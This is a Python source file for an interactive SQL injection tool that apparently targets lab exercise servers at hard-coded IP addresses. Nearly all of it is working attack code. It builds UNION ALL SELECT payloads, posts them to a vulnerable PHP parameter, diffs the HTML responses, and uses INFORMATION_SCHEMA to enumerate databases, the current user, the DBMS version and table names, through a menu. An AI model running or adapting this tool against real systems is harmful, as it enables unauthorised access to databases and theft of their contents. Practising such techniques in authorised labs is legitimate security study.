import requests
from utils import read_headers_file
import re
from bs4 import BeautifulSoup

def get_sqli_info(payload):
    data = [
		{"data": "database","value":"", "payload":""},
		{"data": "username","value":"", "payload":""},
		{"data": "version","value":"", "payload":""},
        {"data": "tables","value":"", "payload":""},
	]
    info = [
		{"payload":"SCHEMA_NAME",	"source":"FROM INFORMATION_SCHEMA.SCHEMATA"}, #Databases
		{"payload":"user()",		"source":""}, #User
		{"payload":"@@version",		"source":""}, # DBMS Version
        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES"}

	]
    cont = 0
    for i in info:
        aux_payload = payload
        aux_payload = aux_payload.replace("payload", i["payload"])
        aux_payload = aux_payload.replace("source", i["source"])
        data[cont]["payload"] = aux_payload
        cont += 1
    return data

def add_values_to_data_payload(raw_values, payload):
    values = raw_values.split()
    payload['value'] = values
    return payload

def get_request(url):
    response  = requests.get(url)
    return response

def post_request(url, data=None, header= None):
    response = requests.post(url, data, headers= header)
    return response

def string_to_json(payload_str):
    try:
        key_value = payload_str.split('=',1)
        if len(key_value) != 2:
            raise ValueError(f"Formato invalido: {payload_str}")
        key = key_value[0].strip()
        value = key_value[1].strip()
        return {key:value}
    except Exception as e:
        print(f"Error procesando el string: {e}")
        return

def limpiar_html(html):
    """Convierte HTML a texto plano, eliminando etiquetas y espacios innecesarios."""
    soup = BeautifulSoup(html, 'html.parser')
    texto = soup.get_text()
    # Eliminar múltiples espacios en blanco
    texto = re.sub(r'\s+', ' ', texto)
    return texto.strip()

def html_diff(text1, text2):
    
    text1 = limpiar_html(text1)
    text2 = limpiar_html(text2)
    
    word1 = text1.split()
    word2 = text2.split()
    
    different_words = []
    cont = 0
    min_len = min(len(word1),len(word2))
    
    for i in range (min_len):
        if word1[i] != word2[i]:
            different_words.append(word2[i])
    
    if len(word2) > min_len:
        different_words.extend(word2[min_len:])
    return " ".join(different_words)


#INITIAL VARIABLES
class SQLI:
    def __init__(self, url, payload, sqli_payload):
        self.url = url
        self.payload = payload
        self.sqli_payload = sqli_payload
        self.headers = read_headers_file("./headers.txt")
        self.data = get_sqli_info(sqli_payload)
        self.automate()
    
    def automate(self):
        for i in range(3):
            self.data[i] = get_dbms_data_values(self, i).data[i]

url = "http://"+"94.237.53.219:39961/case2.php"
headers = read_headers_file("./headers.txt")
payload = {"id": "1"}
sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"

#WORKING CODE
"""
response1 = post_request(url, payload, headers).text


payload = string_to_json(sqli_payload)
response2 = post_request(url, payload, headers).text # Payload OK

aux_payloads = get_sqli_info(sqli_payload)
database_payload = string_to_json(aux_payloads[0]['payload'])
response3 = post_request(url, database_payload, headers).text
result = html_diff(response1,response3)

add_values_to_data_payload(result, aux_payloads[0])
"""
def show_tables_from_specific_database(sqli):
    #Get databases
    print("Available databases:")
    for db in sqli.data[0]['value']:
        print(f"\033[37m- {db}\033[0m")
    #Choose database
    option = str(input("Choose database:\t\033[0m"))
    while option not in sqli.data[0]['value']:
        option = str(input("Invalid database. Choose Database:\t\033[0m"))
    #Set payload to get tables from specific database
    sqli.data[3]['payload'] = sqli.sqli_payload.replace("payload", "TABLE_NAME").replace("source", "FROM INFORMATION_SCHEMA.TABLES")
    sqli.data[3]['payload'] = sqli.data[3]['payload'].replace("INFORMATION_SCHEMA.TABLES", f"INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{option}'")
    #Obtener tablas
    sqli.data[3] = get_dbms_data_values(sqli,3).data[3]
    return sqli
    
#------------
def get_dbms_data_values(sqli, data_index=0):
    try:
        response1 = post_request(sqli.url, sqli.payload, sqli.headers).text
        dbms_data_payload = string_to_json(sqli.data[data_index]['payload'])
        response2 = post_request(sqli.url, dbms_data_payload, sqli.headers).text
        result = html_diff(response1,response2)
        value = add_values_to_data_payload(result, sqli.data[data_index])
        sqli.data[data_index] = value
        return sqli
    except requests.RequestException as e:
        print(f"\033[31mError during request: {e}\033[0m")
        return sqli

def menu(option, sqli):
    result = 0
    if option == 0:
        return result
    elif option == 10:
        new_url = str(input("New url:\t\033[0m"))
        sqli.url = new_url
    elif option == 11:
        new_payload = str(input("New payload (key=value):\t\033[0m"))
        sqli.payload = string_to_json(new_payload)
    elif option == 20:
        try:
            sqli.data[0] = get_dbms_data_values(sqli).data[0]
        except Exception as e:
            print(f"\033[31mError setting database names: {e}\033[0m")
            result = -1 
    elif option == 21:
        sqli.data[1] = get_dbms_data_values(sqli,1).data[1]
    elif option == 22:
        sqli.data[2] = get_dbms_data_values(sqli,2).data[2]
    elif option == 30:
        sqli.data[3] = show_tables_from_specific_database(sqli).data[3]
    if result == 0:
        run(sqli)

def run(sqli):
    print("\nWelcome to your SQL Injection Interface\n")
    print(f"\033[32m--------------\n|\
    URL:\033[37m\t\t{sqli.url}\033[32m\n|\
    Vulnerable param:\t\033[37m{sqli.payload}\033[32m\n|\
    SQLi Payload:\t\033[31m{sqli.sqli_payload}\033[32m")
    
    print("-------------\n")
    
    print("\033[36mENUMERATION")
    print(f"--------------")
    for data in sqli.data:
        print(f"|\t{data['data']}:\t\033[37m{data['value']}\033[36m")
    print(f"--------------")

    print("\033[33mOPTIONS")
    print(f"--------------")
    print("10)\tSet URL")
    print("11)\tSet Payload\n")
    # Automation options
    #print("20)\tGet Database Name")
    #print("21)\tGet User Name")
    #print("22)\tGet DBMS Version")
    print("30)\tShow tables from specific database")
    print("31)\tShow columns from specific table (Not implemented)")
    print("\n0) Exit")
    
    option = int(input("Choose option:\t"))
    menu(option, sqli)

def main ():
    #DEFAULT VALUES
    url = "http://"+"83.136.252.32:52854/case2.php"
    headers = read_headers_file("./headers.txt")
    payload = {"id": "1"}
    sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
    
    sqli = SQLI(url, payload, sqli_payload)
    run(sqli)
main()